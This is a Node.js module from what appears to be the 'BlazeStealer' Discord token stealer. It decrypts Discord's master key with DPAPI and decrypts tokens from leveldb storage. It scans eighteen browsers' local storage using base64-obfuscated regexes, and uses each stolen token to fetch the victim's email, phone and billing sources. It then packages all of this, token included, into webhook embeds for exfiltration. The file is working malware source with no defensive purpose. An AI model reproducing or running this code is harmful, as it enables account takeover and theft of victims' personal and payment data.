const fs = require("fs");
const dpapi = require("win-dpapi");
const crypto = require("crypto");
const core = require("./core");
const axios = require("axios");

class DiscordAccount {
    constructor(username, discriminator, id, nitro, badges, billings, email, phone, token, avatar, bio) {
        this.username = username;
        this.tag = `${username}#${discriminator}`;
        this.id = id;
        this.nitro = nitro;
        this.badges = badges;
        this.billings = billings;
        this.email = email;
        if (phone != "" && phone != undefined) {
            this.phone = phone;
        } else {
            this.phone = "None"
        }
        if (bio != "" && bio != undefined) {
            this.bio = bio.replace(/\n/gm, "\\n")
        } else {
            this.bio = "None"
        }
        this.token = token;
        this.avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png";
    }
}

function getMasterKey(basePath) {
    let masterKeyPath = basePath + "\\Local State";
    let encrypted = Buffer.from(JSON.parse(fs.readFileSync(masterKeyPath, "utf-8"))["os_crypt"]["encrypted_key"], "base64").slice(5);
    return dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');
}

function getEncryptedToken(basepath) {
    let logsPath = basepath + "\\Local Storage\\leveldb\\";
    if (!fs.existsSync(logsPath)) {
        return [];
    }
    let files = fs.readdirSync(logsPath);
    var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/gm;
    var result = [];

    for (let file of files) {
        if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
            continue;
        }

        let content = fs.readFileSync(logsPath + file, "utf-8");
        result = result.concat(content.match(encrypted_regex));
    }

    result = result.filter((item, pos) => result.indexOf(item) == pos);
    result = result.filter(function (el) {
        return el != null;
    });
    return result;
}

function decryptoToken(encryptedTokens, masterKey) {
    var tokens = [];
    for (let encryptedToken of encryptedTokens) {
        try {
            var token = Buffer.from(encryptedToken.split('dQw4w9WgXcQ:')[1], "base64");
            let start = token.slice(3, 15),
                middle = token.slice(15, token.length - 16),
                end = token.slice(token.length - 16, token.length),
                decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, start);

            decipher.setAuthTag(end);
            token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
            tokens.push(token);
        } catch (e) {
            continue
        }
    }
    return tokens;
}

function getBadges(json) {
    let badges = [{
        "name": "<:staff:874750808728666152>",
        "flag": 1
    }, {
        "name": "<:partner:874750808678354964>",
        "flag": 2
    }, {
        "name": "<:hypesquad_events:874750808594477056>",
        "flag": 4
    }, {
        "name": "<:bughunter_1:874750808426692658>",
        "flag": 8
    }, {
        "name": "<:bughunter_2:874750808430874664>",
        "flag": 16384
    }, {
        "name": "<:developer:874750808472825986>",
        "flag": 131072
    }, {
        "name": "<:early_supporter:874750808414113823>",
        "flag": 512
    }, {
        "name": "<:bravery:874750808388952075>",
        "flag": 64
    }, {
        "name": "<:brilliance:874750808338608199>",
        "flag": 128
    }, {
        "name": "<:balance:874750808267292683>",
        "flag": 256
    }, {
        "name": "<:activedev:1041634224253444146>",
        "flag": 4194304
    }]

    let flag = json["flags"];
    var badgesRes = "";

    for (let badge of badges) {
        if ((flag & badge.flag) == badge.flag) {
            badgesRes = badgesRes + " " + badge.name;
        }
    }

    return (badgesRes == "") ? "`None`" : badgesRes;
}

function getNitro(json) {
    if (json["premium_type"] == 1) {
        return "<:classic:896119171019067423>`Nitro Classic`";
    } else if (json["premium_type"] == 2) {
        return "<a:boost:824036778570416129>`Nitro Boost`";
    } else {
        return "`None`";
    }
}

async function getBilling(token) {
    var billings = "";
    try {
        const res = await axios({
            url: `https://canary.discord.com/api/v9/users/@me/billing/payment-sources`,
            method: "GET",
            headers: {
                "Authorization": `${token}`
            }
        })

        for (let billing of res.data) {
            let type = billing["type"];
            let invalid = billing["invalid"];

            if (type == 1 && !invalid) {
                billings = billings + " :credit_card:";
            }
            if (type == 2 && !invalid) {
                billings = billings + " <:paypal:896441236062347374>";
            }
        }
    } catch (e) {};
    return (billings == "") ? "`None`" : billings;
}

async function getAccounts(tokens) {
    let accounts = [];
    for (let token of tokens) {
        var billing;
        try {
            billing = await getBilling(token);
        } catch (e) {
            continue;
        }
        try {
            const res = await axios({
                url: `https://discord.com/api/v9/users/@me`,
                method: "GET",
                headers: {
                    "Authorization": `${token}`
                }
            })
            const json = res.data;
            if (json.message == null) {
                accounts.push(new DiscordAccount(json.username, json.discriminator, json.id, getNitro(json), getBadges(json), billing, json.email, json.phone, token, json.avatar, json.bio));
            }
        } catch (e) {
            continue;
        }
    }

    return accounts;
}

async function grabDiscord() {
    let appdata = process.env.APPDATA;
    let local = process.env.LOCALAPPDATA;
    var discordPath = [
        appdata + "\\discord",
        appdata + "\\discordcanary",
        appdata + "\\discordptb",
    ];

    var tokens = [];

    for (let path of discordPath) {
        if (!fs.existsSync(path)) {
            continue;
        }
        let encryptedTokens = getEncryptedToken(path);
        let masterKey = getMasterKey(path);
        tokens = tokens.concat(decryptoToken(encryptedTokens, masterKey));
    }


    var browsers_path = [
        appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        local + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        local + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        local + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        local + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        local + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        local + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        local + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        local + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Iridium\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Yandex\\YandexBrowser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\uCozMedia\\Uran\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Vivaldi\\User Data\\%PROFILE%\\Local Storage\\leveldb\\"
    ];

    var browsers_profile = [];
    for (var i = 0; i < browsers_path.length; i++) {
        const browser = browsers_path[i];
        const profiles = core.getProfiles(browser, browser.split("\\")[6]);
        for (var j = 0; j < profiles.length; j++) {
            browsers_profile.push(profiles[j].path);
        }
    }

    const reg1 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9", 'base64').toString();
    const reg2 = Buffer.from("bWZhXC5bXHctXXs4NH0=", 'base64').toString();
    const reg3 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==", 'base64').toString();
    
    const cleanRegex = [new RegExp(reg1, 'gm'),
        new RegExp(reg2, 'gm'), new RegExp(reg3, 'gm')
    ];

    for (let path of browsers_profile) {
        if (!fs.existsSync(path)) {
            continue;
        }

        let files = fs.readdirSync(path);
        for (let file of files) {
            for (let reg of cleanRegex) {
                if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
                    continue;
                }

                let content = fs.readFileSync(path + file, "utf-8");
                tokens = tokens.concat(content.match(reg));
            }
        }
    }

    tokens = tokens.filter(function (item, pos) {
        return tokens.indexOf(item) == pos && item != null;
    });

    return await getAccounts(tokens);
}

function embed(username, tag, id, nitro, badges, bio, billings, email, phone, token, avatar) {
    return `{"title":"Thanks for using BlazeStealer","description":"` + username + `'s account","color":16711680,"fields":[{"name":"🔎 User ID","value":"\`` + id + `\`","inline":true},{"name":"👤 Username","value":"\`` + tag + `\`","inline":true},{"name":"📧 Email","value":"\`` + email + `\`"},{"name":"📱 Phone","value":"\`` + phone + `\`","inline":true},{"name":"📌 Badges","value":"` + badges + `","inline":true},{"name":"✨ Nitro","value":"` + nitro + `","inline":true},{"name":"Billings","value":"` + billings + `","inline":true},{"name":"Bio","value":"\`\`\`` + bio + `\`\`\`"},{"name":"Token","value":"\`\`\`` + token + `\`\`\`"}],\n"thumbnail": {\n"url": "` + avatar + `"\n}}`
}

function compile(embeds) {
    var build = "";
    build += `{\n"content": null,\n"embeds": [`
    for (let i = 0; i < embeds.length; i++) {
        build += embeds[i]
        if (i != embeds.length-1) {
            build += ",\n"
        }
    }
    build += `],\n"username": "BlazeStealer",\n"attachments": []\n}`
    return build
}

module.exports = {
    grabDiscord,
    embed,
    compile
}